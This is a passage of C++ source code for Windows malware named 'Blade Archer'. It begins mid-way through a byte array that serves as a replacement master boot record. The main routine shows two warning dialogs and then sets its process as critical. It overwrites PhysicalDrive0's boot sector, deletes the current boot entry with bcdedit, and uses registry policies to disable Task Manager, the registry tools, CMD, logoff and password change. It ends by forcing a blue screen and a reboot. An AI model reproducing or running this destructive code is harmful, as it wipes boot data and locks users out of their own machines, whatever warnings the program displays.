0xC3,0x10,0x14,0x60,0x07,0x14,0xB0,0x08,0x0E,0x14,0x00,0x20,0x40,0x01,0x0D,0x63,0x17,0x40,0xB6,0x40,0x01,0x27,0x03,0x12,0x10,0xE9,0x11,0x0D,0x11,0x00,0x36,0x40,0x01,0x0D,0x59,0x18,0x0B,0xD3,0x03,0x40,0xD6,0x85,0x36,0x21,0x7F,0x18,0x0E,0xE5,0x03,0x1A,0x99,0x1C,0x0F,0x63,0x05,0x10,0x40,0x18,0x40,0xF7,0xE6,0x36,0x1E,0x61,0x01,0x1B,0x40,0x01,0x0F,0x34,0x05,0x40,0x73,0xA3,0x2E,0x40,0xC0,0x40,0x01,0x40,0x66,0x68,0x08,0x40,0xC4,0x40,0x01,0x0F,0x43,0x22,0x15,0xF2,0x22,0x41,0x22,0x40,0x01,0x1E,0x32,0x24,0x41,0x31,0x40,0x01,0x40,0xCF,0xBA,0x08,0x40,0x57,0x40,0x01,0x23,0x72,0x25,0x41,0x34,0x40,0x01,0x06,0x6E,0x07,0x41,0x3B,0x40,0x01,0x16,0x77,0x2A,0x41,0x2F,0x40,0x01,0x40,0x66,0xA9,0x13,0x40,0xBB,0x40,0x01,0x35,0x2D,0x17,0x41,0x2C,0x40,0x01,0x40,0x7C,0x23,0x3B,0x40,0xCE,0x40,0x01,0x40,0xF7,0x88,0x02,0x40,0x4B,0x9E,0x3B,0x41,0x3E,0x40,0x01,0x40,0xF9,0xC0,0x03,0x43,0xC7,0x26,0x5C,0x52,0xC9,0x78,0x71,0x42,0xF9,0x3A,0x73,0x13,0x7D,0x47,0x40,0xFA,0x95,0x1F,0x33,0xFC,0x59,0x41,0x0A,0x71,0x6A,0x41,0x40,0x40,0x01,0x41,0x40,0x40,0x01,0x1C,0xCE,0x44,0x1B,0x53,0x28,0x41,0x2D,0x40,0x01,0x14,0x4E,0x57,0x40,0x9B,0x40,0x01,0x40,0x75,0x41,0x60,0x1B,0xF0,0x26,0x0F,0x4B,0x3F,0x0A,0x87,0x38,0x40,0x96,0x40,0x01,0x40,0x74,0x01,0x5F,0x13,0x03,0x49,0x0F,0x23,0x3A,0x10,0xE9,0x3D,0x0C,0x01,0x44,0x40,0x8E,0x26,0x01,0x40,0x8D,0x40,0x01,0x13,0x07,0x55,0x40,0xA2,0x40,0x01,0x40,0x70,0xD3,0x03,0x18,0x40,0x01,0x16,0x47,0x56,0x40,0xB3,0x40,0x01,0x40,0x5F,0x93,0x02,0x19,0x40,0x01,0x0B,0xC9,0x50,0x14,0x2E,0x3A,0x11,0xA6,0x4F,0x40,0x6B,0x22,0x2C,0x2D,0xBF,0x03,0x34,0x97,0x00,0x2B,0x34,0x00,0x0F,0x57,0x38,0x0E,0x40,0x01,0x15,0xD8,0x4C,0x14,0x80,0x07,0x40,0x6E,0xE2,0x2F,0x2E,0xBF,0x03,0x32,0x96,0x00,0x2C,0xCA,0x00,0x12,0x8C,0x46,0x0F,0x40,0x01,0x11,0x19,0x01,0x13,0x40,0x01,0x40,0x50,0x83,0x6A,0x40,0x83,0x40,0x01,0x2A,0xD6,0x6A,0x24,0x40,0x01,0x1F,0x00,0x0A,0x40,0xC6,0x40,0x01,0x0E,0xE7,0x05,0x40,0x40,0x40,0x01,0x19,0x5A,0x6A,0x0F,0x0F,0x0A,0x16,0x99,0x5B,0x40,0x8B,0x7F,0x07,0x2C,0x0B,0x01,0x1B,0x0D,0x4B,0x22,0x7F,0x4E,0x0D,0x0A,0x01,0x1A,0xB9,0x39,0x0E,0x25,0x44,0x11,0x3C,0x00,0x40,0xA9,0x40,0x01,0x14,0xC5,0x43,0x0E,0x7E,0x08,0x32,0x40,0x01,0x0F,0x77,0x41,0x40,0xBD,0x40,0x01,0x20,0x98,0x77,0x11,0xCB,0x63,0x37,0x40,0x01,0x12,0xF3,0x48,0x20,0x40,0x01,0x0C,0x4C,0x53,0x11,0x3C,0x00,0x1E,0xB6,0x00,0x30,0xFB,0x51,0x2E,0x92,0x03,0x14,0xE8,0x06,0x2B,0x40,0x01,0x0F,0x4E,0x59,0x30,0x1F,0x49,0x12,0xA3,0x42,0x15,0x08,0x04,0x1A,0x5D,0x45,0x14,0x3F,0x53,0x10,0x81,0x5C,0x13,0xC2,0x62,0x0E,0x7D,0x04,0x3E,0x92,0x03,0x2B,0x40,0x01,0x0F,0xCC,0x01,0x0C,0x32,0x50,0x40,0x42,0x40,0x01,0x1B,0x0A,0x09,0x0C,0x9D,0x02,0x14,0x26,0x0F,0x13,0x91,0x07,0x15,0x40,0x01,0x10,0xFC,0x03,0x0B,0xF2,0x47,0x20,0xAB,0x5A,0x40,0x4F,0x40,0x01,0x11,0x3A,0x07,0x34,0x40,0x01,0x13,0xF8,0x4E,0x18,0x5E,0x03,0x0D,0xDD,0x48,0x15,0xB1,0x06,0x0F,0x72,0x4B,0x12,0x91,0x50,0x11,0xDC,0x3D,0x11,0x23,0x52,0x40,0x61,0x40,0x01,0x12,0x7F,0x04,0x3E,0x40,0x01,0x0D,0x0E,0x02,0x2E,0x8B,0x5C,0x16,0x64,0x0B,0x12,0x51,0x4F,0x1C,0x40,0x01,0x0A,0xB4,0x54,0x12,0x6E,0x0F,0x40,0x64,0x40,0x01,0x0F,0xB5,0x0E,0x40,0x66,0x40,0x01,0x18,0x30,0x00,0x2F,0x40,0x01,0x0A,0x73,0x49,0x17,0xAE,0x10,0x28,0x40,0x01,0x1F,0x08,0x76,0x13,0x55,0x62,0x15,0xBE,0x49,0x39,0x4D,0x08,0x2C,0xA5,0x48,0x1B,0x40,0x01,0x0D,0x7E,0x06,0x0F,0xBA,0x66,0x0F,0x51,0x75,0x0E,0xAD,0x4A,0x0E,0x62,0x60,0x2F,0x40,0x01,0x14,0x8F,0x08,0x1B,0x0A,0x0B,0x10,0x2B,0x01,0x40,0x46,0x40,0x01,0x2F,0x8E,0x65,0x1B,0x40,0x01,0x0E,0x79,0x4B,0x11,0x40,0x01,0x12,0x35,0x01,0x17,0xC3,0x59,0x14,0xEC,0x11,0x40,0x61,0x40,0x01,0x37,0x8D,0x0E,0x33,0x40,0x01,0x14,0xCA,0x17,0x32,0x40,0x01,0x15,0x13,0x5A,0x16,0x5B,0x5B,0x40,0x50,0x40,0x01,0x0D,0x35,0x07,0x12,0xFC,0x69,0x32,0xC6,0x71,0x32,0x0E,0x5E,0x17,0x40,0x01,0x0F,0xC7,0x55,0x0E,0x96,0x1A,0x0E,0xED,0x0B,0x14,0x83,0x5D,0x11,0x8D,0x02,0x11,0x9E,0x01,0x1B,0xC3,0x78,0x0D,0xE5,0x58,0x11,0x04,0x5F,0x0C,0x3F,0x03,0x19,0x40,0x01,0x33,0xD3,0x71,0x39,0x40,0x01,0x13,0xA2,0x04,0x0D,0xF4,0x5A,0x0C,0xB1,0x6B,0x0D,0xD4,0x08,0x1E,0x40,0x01,0x15,0xA0,0x15,0x11,0x0C,0x5B,0x10,0x19,0x0D,0x12,0x92,0x68,0x16,0x0D,0x1B,0x12,0x40,0x01,0x13,0x75,0x17,0x40,0x5E,0x40,0x01,0x09,0x7C,0x0A,0x10,0x4F,0x59,0x0D,0xE7,0x6C,0x11,0x35,0x02,0x0E,0x30,0x01,0x17,0xE8,0x04,0x12,0x21,0x13,0x15,0x6B,0x77,0x13,0xC1,0x60,0x1D,0x40,0x01,0x14,0x39,0x68,0x11,0x01,0x0F,0x36,0x84,0x11,0x33,0x40,0x01,0x15,0x7F,0x16,0x0D,0x1B,0x57 };
typedef VOID(_stdcall* RtlSetProcessIsCritical) (
	IN BOOLEAN        NewValue,
	OUT PBOOLEAN OldValue,
	IN BOOLEAN     IsWinlogon);
BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkprivs;
	ZeroMemory(&tkprivs, sizeof(tkprivs));

	if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
		return FALSE;

	if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
		CloseHandle(hToken); return FALSE;
	}

	tkprivs.PrivilegeCount = 1;
	tkprivs.Privileges[0].Luid = luid;
	tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
	CloseHandle(hToken);
	return bRet;
}
BOOL ProcessIsCritical()
{
	HANDLE hDLL;
	RtlSetProcessIsCritical fSetCritical;

	hDLL = LoadLibraryA("ntdll.dll");
	if (hDLL != NULL)
	{
		EnablePriv(SE_DEBUG_NAME);
		(fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
		if (!fSetCritical) return 0;
		fSetCritical(1, 0, 0);
		return 1;
	}
	else
		return 0;
}
DWORD WINAPI KillMBR(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 2560, &dwBytesWritten, 0);
	return 1;
}
void reg_addition(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)//credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition
	);
	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);
	RegCloseKey(hKey);
	return;
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxA(NULL, "Warning! This program is a computer virus that known as 'Blade Archer'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Blade Archer.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookA);
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus(LambdaTechnology) isn't responsible!!!", L"Blade Archer.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			system("taskkill /f /im taskmgr.exe");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
			system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
			system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
			system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
			system("bcdedit /delete {current}");
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_addition(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 1);
			CreateThread(0, 0, KillMBR, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1_num1 = CreateThread(0, 0, Payload1_num1, 0, 0, 0);
			HANDLE thread1_num2 = CreateThread(0, 0, Payload1_num2, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1_num1, 0);
			CloseHandle(thread1_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, Payload2_num1, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, Payload2_num2, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			CloseHandle(thread2_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3_num1 = CreateThread(0, 0, Payload3_num1, 0, 0, 0);
			HANDLE thread3_num2 = CreateThread(0, 0, Payload3_num2, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3_num1, 0);
			CloseHandle(thread3_num1);
			TerminateThread(thread3_num2, 0);
			CloseHandle(thread3_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4_num1 = CreateThread(0, 0, Payload4_num1, 0, 0, 0);
			HANDLE thread4_num2 = CreateThread(0, 0, Payload4_num2, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4_num1, 0);
			CloseHandle(thread4_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5 = CreateThread(0, 0, Payload5_num1, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5, 0);
			CloseHandle(thread5);
			TerminateThread(thread4_num2, 0);
			CloseHandle(thread4_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6 = CreateThread(0, 0, Payload6_num1, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6, 0);
			CloseHandle(thread6);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7_num1 = CreateThread(0, 0, Payload7_num1, 0, 0, 0);
			HANDLE thread7_num2 = CreateThread(0, 0, Payload7_num2, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7_num1, 0);
			CloseHandle(thread7_num1);
			TerminateThread(thread7_num2, 0);
			CloseHandle(thread7_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8_num1 = CreateThread(0, 0, Payload8_num1, 0, 0, 0);
			HANDLE thread8_num2 = CreateThread(0, 0, Payload8_num2, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8_num1, 0);
			CloseHandle(thread8_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9 = CreateThread(0, 0, Payload9_num1, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9, 0);
			CloseHandle(thread9);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10_num1 = CreateThread(0, 0, Payload10_num1, 0, 0, 0);
			HANDLE thread10_num2 = CreateThread(0, 0, Payload10_num2, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10_num1, 0);
			CloseHandle(thread10_num1);
			TerminateThread(thread10_num2, 0);
			CloseHandle(thread10_num2);
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11_num1 = CreateThread(0, 0, Payload11_num1, 0, 0, 0);
			HANDLE thread11_num2 = CreateThread(0, 0, Payload11_num2, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11_num1, 0);
			CloseHandle(thread11_num1);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread12_num1 = CreateThread(0, 0, Payload12_num1, 0, 0, 0);
			HANDLE thread12_num2 = CreateThread(0, 0, Payload12_num2, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12_num1, 0);
			CloseHandle(thread12_num1);
			TerminateThread(thread12_num2, 0);
			CloseHandle(thread12_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13_num1 = CreateThread(0, 0, Payload13_num1, 0, 0, 0);
			HANDLE thread13_num2 = CreateThread(0, 0, Payload13_num2, 0, 0, 0);
			HANDLE thread13_num3 = CreateThread(0, 0, Payload13_num3, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13_num1, 0);
			CloseHandle(thread13_num1);
			TerminateThread(thread13_num2, 0);
			CloseHandle(thread13_num2);
			TerminateThread(thread13_num3, 0);
			CloseHandle(thread13_num3);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread14 = CreateThread(0, 0, Payload14_num1, 0, 0, 0);
			bytebeat14();
			TerminateThread(thread14, 0);
			CloseHandle(thread14);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread15_num1 = CreateThread(0, 0, Payload15_num1, 0, 0, 0);
			HANDLE thread15_num2 = CreateThread(0, 0, Payload15_num2, 0, 0, 0);
			bytebeat15();
			TerminateThread(thread15_num1, 0);
			CloseHandle(thread15_num1);
			TerminateThread(thread15_num2, 0);
			CloseHandle(thread15_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread16_num1 = CreateThread(0, 0, Payload16_num1, 0, 0, 0);
			HANDLE thread16_num2 = CreateThread(0, 0, Payload16_num2, 0, 0, 0);
			bytebeat16();
			TerminateThread(thread16_num1, 0);
			CloseHandle(thread16_num1);
			TerminateThread(thread16_num2, 0);
			CloseHandle(thread16_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread17 = CreateThread(0, 0, Payload17_num1, 0, 0, 0);
			bytebeat17();
			TerminateThread(thread17, 0);
			CloseHandle(thread17);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread1_num2, 0);
			CloseHandle(thread1_num2);
			TerminateThread(thread8_num2, 0);
			CloseHandle(thread8_num2);
			TerminateThread(thread11_num2, 0);
			CloseHandle(thread11_num2);
			InvalidateRect(0, 0, 0);
			refreshscr();
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0005033, 0, 0, 0, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;
			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
	return 0;
}

